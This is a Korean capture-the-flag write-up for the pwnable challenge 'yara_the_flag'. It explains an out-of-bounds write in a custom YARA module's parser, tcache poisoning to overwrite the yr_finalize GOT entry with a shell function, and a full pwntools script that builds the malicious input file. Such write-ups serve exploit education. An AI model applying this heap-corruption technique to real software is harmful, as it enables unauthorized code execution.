---
title: 19cyberoc - yara_the_flag
categories:
 - pwnable
tags: pwn, got_overwrite, malloc, heap, oob, tcache
---

- Introduction
- Vunlnerability
- Exploit
- slv.py
- 느낀 점
- Reference

## Introduction

약 1년전에 군대 사무실 선임, 간부님들과 함께 나갔던 대회에서 풀었던 문제다. 그때 당시에는 이 문제가 어떤 문제인지도 모르는 상태에서 삽질을 1200만번정도 한것같다... 애초에 라이브러리 패치파일을 참고해서 익스하는 문제를 처음 접했었다.

아무튼 라이브러리에 플러그인 비슷하게 라이브러리에 모듈을 넣어서 해당 모듈의 소스코드를 제공하고 해당 코드에서의 취약점을 토대로 익스를 진행하면 되는 문제이다.

혹시나 대회 특성상 롸업이 문제가 된다면 바로 내리도록 하겠습니다. (kws981024@naver.com)으로 메일주세요.

## Vunlnerability

`Unit_Parse` 함수에서 `out[unit->unitID] = new;`을 수행하는데 `unit->unitID`를 조작할 수 있기 때문에 OOB가 발생한다.

추가적으로 `Container_Parse` 함수에서 `containers[container->containerID] = entry;`를 수행할때도 동일하게 OOB가 발생한다. 이를 이용해서 익스를 진행해보려고 했는데 생각만큼 되진 않았다.

## Exploit

`Unit_Parse`에서 일어나는 OOB는 heap영역이고 `Container_Parse`에서 일어나는 OOB는 `libyara.so.3.9.0`에서 일어난다.

결과적으로는 `Unit_Parse`에서 일어나는 OOB만 사용하게 되는데, heap영역에 할당된 tcache 구조체에 존재하는 0x20에 해당하는 idx를 overwrite해서 다음 malloc(0x20)을 할때 할당되는 주소를 조작한다. 참고로 tcache를 할당할때 tcache의 count에 대한 검증을 하지 않기때문에 next에 주소만 있으면 할당받을 수 있게 된다.

바이너리에 존재하는 `yr_finalize`의 got를 malloc으로 할당받아서 `giveShell`의 주소로 바꿔서 쉘을 얻게된다.

## slv.py
```python
from pwn import *

e = ELF('./yara')

BLOCK_SIZE = 0x20
GH_MAGIC = 0x52434553
CONTAINER_MAGIC = 0x524e5443
UNIT_MAGIC = 0x54494e55

shell_addr = 0x404160
yr_finalize_got = e.got['yr_finalize']

def g_header(cnt, head, capacity):
    
    g_header_struct = ''
    g_header_struct += p32(GH_MAGIC) # magic
    g_header_struct += cnt # containerCnt
    g_header_struct += head # containerHead
    g_header_struct += capacity # containerCapacity
    g_header_struct += p32(0xdeadbeef) * 4 # reserved[16]
    
    return g_header_struct


def ct(cnt, vector, next, id):

    ct_struct = ''
    ct_struct += p32(CONTAINER_MAGIC) # magic
    ct_struct += cnt # unitCnt
    ct_struct += vector # unitVector
    ct_struct += next # next
    ct_struct += id # containerID
    ct_struct += p32(0xdeadbeef) * 2 # reserved[8]
    
    return ct_struct


def ui(data, key, id):
    
    ui_struct = ''
    ui_struct += p32(UNIT_MAGIC) # magic
    ui_struct += data # unitData[8]
    ui_struct += key # unitKey[8]
    ui_struct += id # unitID
    ui_struct += p32(0xdeadbeef) # reserved[4]
    
    return ui_struct
	

def ui2(data, key, id):
    
    ui_struct = ''
    ui_struct += p32(0xdeadbeef) # magic
    ui_struct += data # unitData[8]
    ui_struct += key # unitKey[8]
    ui_struct += id # unitID
    ui_struct += p32(0xdeadbeef) # reserved[4]
    
    return ui_struct
	

def uiE(data, key):
    
    uiE_struct = ''
    uiE_struct += data
    uiE_struct += key

    return uiE_struct


def ctE(cnt, vector):
    
    ctE_struct = ''
    ctE_struct += cnt
    ctE_struct += vector
    
    return ctE_struct


def main():
    
    f = open('./test.file', 'w')
    
    payload = ''
    payload += g_header(p32(1), p32(1), p32(3))
    payload += ct(p32(2), p32(2), p32(0), p64(0))
    payload += p32(3) + p32(4) + p32(0) + p32(0)*5 # padding
    payload += ui(p64(yr_finalize_got), p64(0x3232323232323232), p64(0xFFFFFFFFFFFE603E))
    payload += ui(p64(0xdeadbeefdeadbeef), p64(shell_addr), p64(0))
    #payload += ui(p64(shell_addr), p64(0x3232323232323232), p64(1))
    
    f.write(payload)
    
    f.close()
        
```

사실 `yr_finalize`말고 `printf`의 got를 overwrite하고서는 에러가 뜨길래 `Container_Parse`에서 발생하는 OOB를 이용해 바이너리의 got가 아닌 `libyara.so.3.9.0`에 존재하는 got를 overwrite해서 문제를 푸는 줄 알았다. 하지만 진행하려고 보니까 

```c++
entry->unitCnt = container->unitCnt;
entry->vector = (UnitEntry_t **)calloc(entry->unitCnt, sizeof(UnitEntry_t *));
containers[container->containerID] = entry;
```

에서 `entry`에 `giveShell`의 주소가 들어가면서 got overwrite가 진행되어야 한다. 하지만 code영역에 write권한이 없는데 `entry->unitCnt`, `entry->vector`에 값을 넣는 부분이 존재하기 때문에 segment fault가 발생하게 된다. 그래서 삽질을 계속 하고있었는데...

그냥 `yr_finalize`에 got overwrite를 진행하면 간단히 해결되서 좀 허무한 감이 없잖아 있었다.

## 느낀 점

그때 당시 이 문제의 접근방향을 일찍 알아차렸더라면 취약점도 일찍 찾고 익스의 방향에 대해서 고민이라도 했을텐데.. 라는 아쉬움이 남는 문제였다. 사실 문제를 풀고나니 당시에 tcache 구조체를 overwrite해서 진행하는 익스에 대해서 모르고 있는 상황이었기 때문에 취약점을 일찍 찾아도 익스를 할 수 있었을지는 의문이다...

그래도 예전에 못 푼 문제를 지금 풀어보니 한결 수월해졌다는 느낌이 든다.. 1년전 문제라 당연한건가... 


## Reference

.

